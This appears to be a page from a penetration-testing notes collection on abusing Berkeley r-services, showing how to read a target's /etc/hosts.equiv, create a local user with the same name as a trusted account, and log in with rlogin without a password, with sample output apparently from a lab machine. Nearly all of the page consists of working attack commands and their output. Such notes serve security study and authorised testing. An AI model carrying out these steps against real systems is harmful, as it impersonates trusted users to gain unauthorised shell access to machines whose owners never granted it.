---
title: "R Services"
date: 2025-7-16
tags: ["R Services", "rlogin", "rexec", "rsh", "r-commands", "Shell", "Berkeley"]
---

### Abuse #1: Fake a User

#### 1. Check

```console
cat /etc/hosts.equiv
```

```console {class="sample-code"}
(remote) www-data@reset:/home/sadm$ cat /etc/hosts.equiv
# /etc/hosts.equiv: list  of  hosts  and  users  that are granted "trusted" r
#                   command access to your system .
- root
- local
+ sadm
```

#### 2. Create the Target User Locally

```console
# Create a fake user
sudo useradd <USER>
```

```console
# Set password
sudo passwd <USER> 
```

```console {class="sample-code"}
$ sudo useradd sadm
                                                                                                                                                                                                                                                                                                                            
$ sudo passwd sadm 
New password: 
Retype new password: 
passwd: password updated successfully
                                                                                                                                                                                                                                                                                                                            
$ cat /etc/passwd | grep sadm
sadm:x:1001:1001::/home/sadm:/bin/sh
```

```console
# Switch user
su <USER>
```

#### 3. Connect

```console
# Installation
sudo apt install rsh-redone-client
```

```console
# Connect
rlogin <TARGET>
```

#### 4. Revert

```console
sudo userdel <USER>
```